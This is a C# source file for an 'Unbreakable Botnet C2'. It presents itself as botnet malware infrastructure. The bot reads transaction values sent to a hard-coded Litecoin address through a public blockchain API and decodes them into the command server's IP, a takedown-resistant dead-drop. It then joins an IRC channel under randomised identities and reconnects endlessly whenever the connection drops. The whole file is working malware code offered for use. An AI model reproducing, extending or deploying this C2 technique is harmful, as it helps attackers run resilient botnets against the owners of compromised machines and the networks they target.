/* 
	Unbreakable Botnet C2
	by gnx @ freenode
	twitter.com/alissonbertochi
	
	https://github.com/gnxbr/Unbreakable-Botnet-C2
*/

using System;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Runtime.InteropServices;

public class Txrefs{
    public string tx_hash { get; set; }
    public double block_height { get; set; }
    public int tx_input_n { get; set; }
    public double value { get; set; }
    public double ref_balance { get; set; }
    public int confirmations { get; set; }
    public string confirmed { get; set; }
    public bool double_spend { get; set; }
}

public class Balance{

    public string address { get; set; }
    public double total_received  { get; set; }
    public double total_sent  { get; set; }
    public double unconfirmed_balance {get; set; }
    public double final_balance  { get; set; }
    public double n_tx  { get; set; }
    public double final_n_tx  { get; set; }
    public List<Txrefs> txrefs { get; set; }

}

public static class IPC2{

    public static string ToAddr(string address){
        return IPAddress.Parse(address.ToString()).ToString();
    }

    public static string Do(){
        string address = "ltc1ql7dlh7f05dufsd5dpjucu3rz0cdezkqtxrngqj";
        var result = new System.Net.WebClient().DownloadString("https://api.blockcypher.com/v1/ltc/main/addrs/" + address);
        var parsed = JsonSerializer.Deserialize<Balance>(result);
        bool start = false;
        int round = 0;
        List<string> ipzinho = new List<string>();

        for(int i=0; i<parsed.txrefs.Count;i++){

            if(parsed.txrefs[i].tx_input_n == -1 && parsed.txrefs[i].confirmations > 0){
                if(round == 2){
                    break;
                }
                if(start){
                    round++;
                    ipzinho.Add(parsed.txrefs[i].value.ToString());
                }

                if(parsed.txrefs[i].value == 31337){
                    start = true;
                }
            }
        }

        return String.Join("", ipzinho);
    }

}

public class Bot{

    private Socket client;
    private string botPrefix;
    private string nickname;
    private int port;
    private string server;
    private string channel;
    private string ident;
    private string hostname;
    private string realname;
    private string channelPasswd;

    public Bot(int port, string channel, string botPrefix, [Optional] string channelPasswd){

        this.port = port;
        this.channel = channel;
        this.botPrefix = botPrefix;
        GenerateNick();

        if(String.IsNullOrEmpty(channelPasswd)){
            this.channelPasswd = "";
        }
        else{
            this.channelPasswd = channelPasswd;
        }

        this.ident = GenerateString(7);
        Thread.Sleep(15);
        this.hostname = GenerateString(4);
        Thread.Sleep(15);
        this.realname = GenerateString(5);

    }
    ~Bot(){
        client.Close();
    }
    private void GenerateNick(){
        Random random = new Random();
        this.nickname = this.botPrefix + "-" + random.Next(1000);
    }
    private string GenerateString(int qtde){

        string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        List<char> result = new List<char>();

        Random novo = new Random();
        int index;

        for(int i = 0; i < qtde; i++){
            index = novo.Next(letters.Length);
            result.Add(letters[index]);
        }

        return String.Join("",result.ToArray());
    }
    private void Send(string cmd){
        byte[] msg = Encoding.ASCII.GetBytes(cmd + "\n");
        client.Send(msg);
    }
    
    private void Join(string channel, string password){
        if(String.IsNullOrEmpty(password)){
            Send("JOIN " + channel);
        }
        else{
            Send("JOIN " + channel + " " + password);
        }
    }
    private void Ping(){
        Send("PONG :Pong");
    }
    private void Print(byte[] buffer, int bytesRec){
        
        Console.WriteLine("{0}",Encoding.ASCII.GetString(buffer, 0, bytesRec));
    }
    public void Connect(){

        this.server = IPC2.ToAddr(IPC2.Do());

        IPHostEntry ipHostInfo = Dns.GetHostEntry(IPAddress.Parse(this.server));  
        IPAddress ipAddress = ipHostInfo.AddressList[0];
        IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);

        client = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        client.Connect(remoteEP);

        byte[] msg = Encoding.ASCII.GetBytes("NICK " + nickname + "\n");
        client.Send(msg);

        msg = Encoding.ASCII.GetBytes("USER " + this.ident + " " + this.hostname + " 0 " + this.realname + "\n");
        client.Send(msg);

        byte[] buffer= new byte[2048];

        Join(this.channel, this.channelPasswd);

        while(true){

            try{
                int bytesRec = client.Receive(buffer);
                Print(buffer, bytesRec);

                if(Encoding.ASCII.GetString(buffer, 0, bytesRec).Contains("PING")){
                    Ping();
                }
            }
            catch(Exception){
                while(true){
                    try{
                        GenerateNick();
                        Connect();
                    }
                    catch(Exception){
                        continue;
                    }
                }
            }

        }        
    }
}

public class Principal{
        public static void Main(){

	    // Port, Channel, Bot Prefix, [Optional] Channel Passwd
            Bot bot = new Bot(6667, "#s0ldiers", "el8");

            bot.Connect();

    }
}
